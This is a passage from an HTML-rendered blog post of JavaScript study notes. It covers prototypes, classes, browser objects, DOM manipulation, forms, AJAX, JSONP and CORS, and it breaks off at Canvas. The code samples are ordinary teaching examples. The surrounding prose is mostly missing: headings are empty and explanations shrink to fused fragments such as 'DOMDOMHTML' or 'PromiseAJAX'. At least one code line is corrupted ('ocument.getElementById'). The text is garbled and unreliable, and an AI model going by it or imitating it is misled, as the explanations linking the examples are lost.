class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">function Student(props)&#123;</span><br><span class=\"line\">\tthis.name &#x3D; props.name;</span><br><span class=\"line\">\tthis.grade &#x3D; props.grade;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Student.prototype.hello &#x3D; function()&#123;</span><br><span class=\"line\">\talert(&#39;hello&#39;+this.name+&#39;.&#39;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function createStudent(props)&#123;</span><br><span class=\"line\">\treturn new Student(props);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>hello</code><code>hello</code><code>xiaoming</code><code>xiaohong</code><code>Student.prototype</code></p>\n<p><img src=\"/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200730200247420.png\" alt=\"image-20200730200247420\"></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Student</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.name = props.name || <span class=\"string\">'Unnamed'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Student.prototype.hello = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    alert(<span class=\"string\">'Hello, '</span> + <span class=\"keyword\">this</span>.name + <span class=\"string\">'!'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">PrimaryStudent</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// Studentthis:</span></span><br><span class=\"line\">    Student.call(<span class=\"keyword\">this</span>, props);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.grade = props.grade || <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">new</span> PrimaryStudent() ----&gt; PrimaryStudent.prototype ----&gt; <span class=\"built_in\">Object</span>.prototype ----&gt; <span class=\"literal\">null</span></span><br></pre></td></tr></table></figure>\n<p></p>\n<p><img src=\"/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200730203439073.png\" alt=\"image-20200730203439073\"></p>\n<h2 id=\"class\"><a href=\"#class\" class=\"headerlink\" title=\"class\"></a>class</h2><p><strong>class</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Student</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(name) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    hello() &#123;</span><br><span class=\"line\">        alert(<span class=\"string\">'Hello, '</span> + <span class=\"keyword\">this</span>.name + <span class=\"string\">'!'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> xiaoming = <span class=\"keyword\">new</span> Student(<span class=\"string\">'xiaoming'</span>);</span><br><span class=\"line\">xiaoming.hello();</span><br></pre></td></tr></table></figure>\n<p><strong>class</strong></p>\n<p><code>extends</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">PrimaryStudent</span> <span class=\"keyword\">extends</span> <span class=\"title\">Student</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(name, grade) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(name); <span class=\"comment\">// super!</span></span><br><span class=\"line\">        <span class=\"keyword\">this</span>.grade = grade;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    myGrade() &#123;</span><br><span class=\"line\">        alert(<span class=\"string\">'I am at grade '</span> + <span class=\"keyword\">this</span>.grade);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>super(name)</code><code>name</code></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong>window</strong></p>\n<p><code>window</code></p>\n<ul>\n<li><code>innerWidth</code> <code>innerHeight</code></li>\n<li><code>outerWidth</code> <code>outerHeight</code></li>\n</ul>\n<p><strong>navigator</strong></p>\n<p><code>navigator</code></p>\n<ul>\n<li>navigator.appName</li>\n<li>navigator.appVersion</li>\n<li>navigator.language</li>\n<li>navigator.platform</li>\n<li>navigator.userAgent<code>User-Agent</code></li>\n</ul>\n<h3 id=\"screen\"><a href=\"#screen\" class=\"headerlink\" title=\"screen\"></a>screen</h3><p><code>screen</code></p>\n<ul>\n<li>screen.width</li>\n<li>screen.height</li>\n<li>screen.colorDepth81624</li>\n</ul>\n<h3 id=\"location\"><a href=\"#location\" class=\"headerlink\" title=\"location\"></a>location</h3><p><code>location</code>URL</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location.href  &#x2F;&#x2F;url</span><br><span class=\"line\">location.protocol; &#x2F;&#x2F; &#39;http&#39;</span><br><span class=\"line\">location.host; &#x2F;&#x2F; &#39;www.example.com&#39;</span><br><span class=\"line\">location.port; &#x2F;&#x2F; &#39;8080&#39;</span><br><span class=\"line\">location.pathname; &#x2F;&#x2F; &#39;&#x2F;path&#x2F;index.html&#39;</span><br><span class=\"line\">location.search; &#x2F;&#x2F; &#39;?a&#x3D;1&amp;b&#x3D;2&#39;</span><br><span class=\"line\">location.hash; &#x2F;&#x2F; &#39;TOP&#39;</span><br><span class=\"line\">location.assign(&#39;...&#39;)  &#x2F;&#x2F;</span><br><span class=\"line\">location.reload()  &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h3 id=\"document\"><a href=\"#document\" class=\"headerlink\" title=\"document\"></a>document</h3><p><code>document</code>HTMLDOM<code>document</code>DOM</p>\n<p><code>document</code><code>getElementById()</code><code>getElementsByTagName()</code>IDDOMTagDOM</p>\n<p><code>document</code><code>cookie</code>CookieJavaScript<code>document.cookie</code>Cookie</p>\n<h3 id=\"history\"><a href=\"#history\" class=\"headerlink\" title=\"history\"></a>history</h3><p><code>history</code>JavaScript<code>history</code><code>back()</code><code>forward ()</code></p>\n<h2 id=\"DOM\"><a href=\"#DOM\" class=\"headerlink\" title=\"DOM\"></a>DOM</h2><p>HTMLDOMHTMLJavaScriptDOM</p>\n<p>DOMDOM</p>\n<ul>\n<li>DOMDOMHTML</li>\n<li>DOM</li>\n<li>DOMHTML</li>\n<li>HTMLDOM</li>\n</ul>\n<p>DOMDOM<code>document.getElementById()</code><code>document.getElementsByTagName()</code>CSS<code>document.getElementsByClassName()</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">document.getElementById(&#39;test&#39;);  &#x2F;&#x2F; ID&#39;test&#39;</span><br><span class=\"line\">ocument.getElementById(&#39;test-table&#39;).getElementsByTagName(&#39;tr&#39;);  &#x2F;&#x2F; ID&#39;test-table&#39;tr</span><br><span class=\"line\">document.getElementById(&#39;test-div&#39;).getElementsByClassName(&#39;red&#39;);  &#x2F;&#x2F; ID&#39;test-div&#39;classred</span><br><span class=\"line\">test.firstElementChild &#x2F;&#x2F;test</span><br><span class=\"line\">test.lastElementChild  &#x2F;&#x2F;test</span><br></pre></td></tr></table></figure>\n<p><code>querySelector()</code><code>querySelectorAll()</code>selector</p>\n<p><strong></strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- HTML --&gt;</span><br><span class=\"line\">&lt;div id=<span class=\"string\">\"test-div\"</span>&gt;</span><br><span class=\"line\">&lt;div <span class=\"class\"><span class=\"keyword\">class</span></span>=<span class=\"string\">\"c-red\"</span>&gt;</span><br><span class=\"line\">    &lt;p id=<span class=\"string\">\"test-p\"</span>&gt;JavaScript&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;p&gt;Java&lt;/</span>p&gt;</span><br><span class=\"line\">  &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  &lt;div class=\"c-red c-green\"&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;p&gt;Python&lt;/</span>p&gt;</span><br><span class=\"line\">    &lt;p&gt;Ruby&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;p&gt;Swift&lt;/</span>p&gt;</span><br><span class=\"line\">  &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  &lt;div class=\"c-green\"&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;p&gt;Scheme&lt;/</span>p&gt;</span><br><span class=\"line\">    &lt;p&gt;Haskell&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  &lt;/</span>div&gt;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">/</span><span class=\"regexp\">/ &lt;p&gt;JavaScript&lt;/</span>p&gt;:</span><br><span class=\"line\"><span class=\"keyword\">var</span> js = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'test-p'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// &lt;p&gt;Python&lt;/p&gt;,&lt;p&gt;Ruby&lt;/p&gt;,&lt;p&gt;Swift&lt;/p&gt;:</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = <span class=\"built_in\">document</span>.getElementsByClassName(<span class=\"string\">'c-red'</span>)[<span class=\"number\">1</span>].getElementsByTagName(<span class=\"string\">'p'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// &lt;p&gt;Haskell&lt;/p&gt;:</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> haskell = <span class=\"built_in\">document</span>.getElementsByClassName(<span class=\"string\">'c-green'</span>)[<span class=\"number\">1</span>].lastElementChild;</span><br></pre></td></tr></table></figure>\n<h3 id=\"DOM\"><a href=\"#DOM\" class=\"headerlink\" title=\"DOM\"></a>DOM</h3><p><code>innerHTML</code>DOMHTMLDOM</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;&lt;p id &#x3D; &#39;p&#39;&gt;...&lt;&#x2F;p&gt;</span><br><span class=\"line\">var p &#x3D; document.getElementById(&#39;p&#39;);</span><br><span class=\"line\">p.innerHTML &#x3D; &#39;ABC&#39;</span><br><span class=\"line\">&#x2F;&#x2F;&lt;p id &#x3D; &#39;p&#39;&gt;ABC&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>\n<p><code>innerText</code><code>textContent</code>HTMLHTML</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; &lt;p id&#x3D;&quot;p-id&quot;&gt;...&lt;&#x2F;p&gt;</span><br><span class=\"line\">var p &#x3D; document.getElementById(&#39;p-id&#39;);</span><br><span class=\"line\">&#x2F;&#x2F; :</span><br><span class=\"line\">p.innerText &#x3D; &#39;&lt;script&gt;alert(&quot;Hi&quot;)&lt;&#x2F;script&gt;&#39;;</span><br><span class=\"line\">&#x2F;&#x2F; HTML&lt;script&gt;:</span><br><span class=\"line\">&#x2F;&#x2F; &lt;p id&#x3D;&quot;p-id&quot;&gt;&lt;script&gt;alert(&quot;Hi&quot;)&lt;&#x2F;script&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"DOM\"><a href=\"#DOM\" class=\"headerlink\" title=\"DOM\"></a>DOM</h3><p><code>appendChild</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- HTML --&gt;</span><br><span class=\"line\">&lt;p id=<span class=\"string\">\"js\"</span>&gt;JavaScript&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;div id=\"list\"&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;p id=\"java\"&gt;Java&lt;/</span>p&gt;</span><br><span class=\"line\">    &lt;p id=<span class=\"string\">\"python\"</span>&gt;Python&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;p id=\"scheme\"&gt;Scheme&lt;/</span>p&gt;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">var list = document.getElementById('list');</span></span><br><span class=\"line\"><span class=\"regexp\">js = document.createElement('p');</span></span><br><span class=\"line\"><span class=\"regexp\">js.id = 'js';</span></span><br><span class=\"line\"><span class=\"regexp\">js.innerText = 'javascript';</span></span><br><span class=\"line\"><span class=\"regexp\">list.appendChild(js);</span></span><br></pre></td></tr></table></figure>\n<p><code>insertBefore</code><code>parentElement.insertBefore(newElement, referenceElement);</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span></span><br><span class=\"line\">    list = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'list'</span>),</span><br><span class=\"line\">    ref = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'python'</span>),</span><br><span class=\"line\">    haskell = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'p'</span>);</span><br><span class=\"line\">haskell.id = <span class=\"string\">'haskell'</span>;</span><br><span class=\"line\">haskell.innerText = <span class=\"string\">'Haskell'</span>;</span><br><span class=\"line\">list.insertBefore(haskell, ref);</span><br></pre></td></tr></table></figure>\n<h3 id=\"DOM\"><a href=\"#DOM\" class=\"headerlink\" title=\"DOM\"></a>DOM</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=<span class=\"string\">\"parent\"</span>&gt;</span><br><span class=\"line\">    &lt;p&gt;First&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;p&gt;Second&lt;/</span>p&gt;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">var parent = document.getElementById('parent');</span></span><br><span class=\"line\"><span class=\"regexp\">parent.removeChild(parent.children[0]);</span></span><br><span class=\"line\"><span class=\"regexp\">parent.removeChild(parent.children[1]); /</span><span class=\"regexp\">/ &lt;-- </span></span><br></pre></td></tr></table></figure>\n<p><code>parent.children[1]</code><code>&lt;p&gt;First&lt;/p&gt;</code><code>parent.children</code>21<code>[1]</code></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>HTML</p>\n<ul>\n<li><code>&lt;input type=&quot;text&quot;&gt;</code></li>\n<li><code>&lt;input type=&quot;password&quot;&gt;</code></li>\n<li><code>&lt;input type=&quot;radio&quot;&gt;</code></li>\n<li><code>&lt;input type=&quot;checkbox&quot;&gt;</code></li>\n<li><code>&lt;select&gt;</code></li>\n<li><code>&lt;input type=&quot;hidden&quot;&gt;</code></li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var input &#x3D; document.getElementById(&#39;email&#39;);</span><br><span class=\"line\">input.value  &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var input &#x3D; document.getElementById(&#39;email&#39;);</span><br><span class=\"line\">input.value &#x3D; &#39;test&#39;;  &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h3 id=\"HTML5\"><a href=\"#HTML5\" class=\"headerlink\" title=\"HTML5\"></a>HTML5</h3><p>HTML5<code>date</code><code>datetime</code><code>datetime-local</code><code>color</code><code>&lt;input&gt;</code></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><code>&lt;form&gt;</code><code>submit()</code><code>&lt;button&gt;</code><code>click</code>JavaScript</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- HTML --&gt;</span><br><span class=\"line\">&lt;form id=<span class=\"string\">\"test-form\"</span>&gt;</span><br><span class=\"line\">    &lt;input type=<span class=\"string\">\"text\"</span> name=<span class=\"string\">\"test\"</span>&gt;</span><br><span class=\"line\">    &lt;button type=<span class=\"string\">\"button\"</span> onclick=<span class=\"string\">\"doSubmitForm()\"</span>&gt;Submit&lt;<span class=\"regexp\">/button&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;/</span>form&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doSubmitForm</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> form = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'test-form'</span>);</span><br><span class=\"line\">    <span class=\"comment\">// forminput...</span></span><br><span class=\"line\">    <span class=\"comment\">// form:</span></span><br><span class=\"line\">    form.submit();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>&lt;form&gt;</code><code>onsubmit</code>form</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- HTML --&gt;</span><br><span class=\"line\">&lt;form id=<span class=\"string\">\"test-form\"</span> onsubmit=<span class=\"string\">\"return checkForm()\"</span>&gt;</span><br><span class=\"line\">    &lt;input type=<span class=\"string\">\"text\"</span> name=<span class=\"string\">\"test\"</span>&gt;</span><br><span class=\"line\">    &lt;button type=<span class=\"string\">\"submit\"</span>&gt;Submit&lt;<span class=\"regexp\">/button&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;/</span>form&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkForm</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> form = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'test-form'</span>);</span><br><span class=\"line\">    <span class=\"comment\">// forminput...</span></span><br><span class=\"line\">    <span class=\"comment\">// :</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>HTML<code>&lt;input type=&quot;file&quot;&gt;</code></p>\n<p><em></em><code>&lt;input type=&quot;file&quot;&gt;</code><code>enctype</code><code>multipart/form-data</code><code>method</code><code>post</code><code>multipart/form-data</code></p>\n<p><code>&lt;input type=&quot;file&quot;&gt;</code>JavaScript<code>&lt;input type=&quot;file&quot;&gt;</code><code>value</code>JavaScript</p>\n<h2 id=\"AJAX\"><a href=\"#AJAX\" class=\"headerlink\" title=\"*AJAX\"></a>*AJAX</h2><p>HTTPJavaScriptJavaScript</p>\n<p>JavaScriptAJAX<strong>AJAX</strong></p>\n<p><code>XMLHttpRequest</code><code>onreadystatechange</code><code>readyState === 4</code><code>status === 200</code></p>\n<p><code>XMLHttpRequest</code><code>open()</code>3<code>GET</code><code>POST</code>URL<code>true</code></p>\n<p><em></em><code>false</code>AJAX1010</p>\n<p><code>send()</code><code>GET</code><code>POST</code>body<code>FormData</code></p>\n<p><strong></strong></p>\n<p>URL<code>&#39;http://www.sina.com.cn/&#39;</code>Chrome<strong>JavaScriptAJAXURL<code>www.example.com</code><code>example.com</code><code>http</code><code>https</code><code>:80</code><code>:8080</code></strong></p>\n<p>JSURL</p>\n<p>FlashHTTPFlashFlashFlash</p>\n<p>JavaScript</p>\n<p>JSONPGETJavaScriptJavaScript</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;example.com&#x2F;abc.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">...</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n<p>JSONPJavaScript</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foo(&#39;data&#39;);</span><br></pre></td></tr></table></figure>\n<p><code>foo()</code><code>&lt;script&gt;</code>JavaScript</p>\n<p>163URLURL<a href=\"http://api.money.126.net/data/feed/0000001,1399001?callback=refreshPrice\" target=\"_blank\" rel=\"noopener\">http://api.money.126.net/data/feed/0000001,1399001?callback=refreshPrice</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">refreshPrice(&#123;&quot;0000001&quot;:&#123;&quot;code&quot;: &quot;0000001&quot;, ... &#125;);</span><br></pre></td></tr></table></figure>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function refreshPrice(data) &#123;</span><br><span class=\"line\">    var p &#x3D; document.getElementById(&#39;test-jsonp&#39;);</span><br><span class=\"line\">    p.innerHTML &#x3D; &#39;&#39; +</span><br><span class=\"line\">        data[&#39;0000001&#39;].name +&#39;: &#39; + </span><br><span class=\"line\">        data[&#39;0000001&#39;].price + &#39;&#39; +</span><br><span class=\"line\">        data[&#39;1399001&#39;].name + &#39;: &#39; +</span><br><span class=\"line\">        data[&#39;1399001&#39;].price;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>: 3310.01: 13637.883</p>\n<p></p>\n<p><code>getPrice()</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function getPrice() &#123;</span><br><span class=\"line\">    var</span><br><span class=\"line\">        js &#x3D; document.createElement(&#39;script&#39;),</span><br><span class=\"line\">        head &#x3D; document.getElementsByTagName(&#39;head&#39;)[0];</span><br><span class=\"line\">    js.src &#x3D; &#39;http:&#x2F;&#x2F;api.money.126.net&#x2F;data&#x2F;feed&#x2F;0000001,1399001?callback&#x3D;refreshPrice&#39;;</span><br><span class=\"line\">    head.appendChild(js);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p></p>\n<p><strong>CORS</strong></p>\n<p>CORSCross-Origin Resource Sharing</p>\n<p>Origin</p>\n<p></p>\n<p>JavaScript<code>Access-Control-Allow-Origin</code>JavaScript</p>\n<p><img src=\"/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200801154253687.png\" alt=\"image-20200801154253687\"></p>\n<h2 id=\"Promise\"><a href=\"#Promise\" class=\"headerlink\" title=\"Promise\"></a>Promise</h2><p>PromiseAJAX<code>success</code><code>fail</code></p>\n<p><img src=\"/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200801155554430.png\" alt=\"image-20200801155554430\"></p>\n<p><strong>PromiseAJAX</strong></p>\n<h2 id=\"Canvas\"><a href=\"#Canvas\" class=\"headerlink\" title=\"Canvas\"></a>Canvas</h2><p>CanvasHTML5JavaScript</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 